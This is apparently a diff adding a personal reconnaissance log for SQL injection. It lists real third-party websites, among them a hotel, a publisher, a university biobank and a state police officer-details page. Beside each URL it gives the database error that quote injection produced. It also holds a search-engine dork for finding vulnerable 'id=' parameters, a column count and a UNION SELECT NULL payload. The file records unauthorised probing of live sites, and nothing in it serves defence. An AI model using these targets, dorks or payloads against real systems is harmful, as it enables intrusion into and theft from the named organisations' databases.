@@ -1,0 +1,25 @@
+https://www.pbw-india.com/category.php?id=1           || cannot select category You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+
+https://www.lagnakaro.com/wedding-resources.php?id=1  || You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
+
+https://biobank.ndph.ox.ac.uk/ukb/docs.cgi?id=1%27    || Sorry, internal error prevents display of document listing
+
+http://www.embryohotel.com/room-detail.php?id=1       || You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+
+https://www.copalpublishing.com/books.php?id=1        || Conditional responce
+
+
+
+inurl:"?id=1"  || 25 pages completed 
+
+MAY BE 
+
+https://police.rajasthan.gov.in/Officer_Details.aspx?id=1
+
+
+
+http://www.embryohotel.com/room-detail.php?id=1       || You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+
+5 columns
+
+'' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
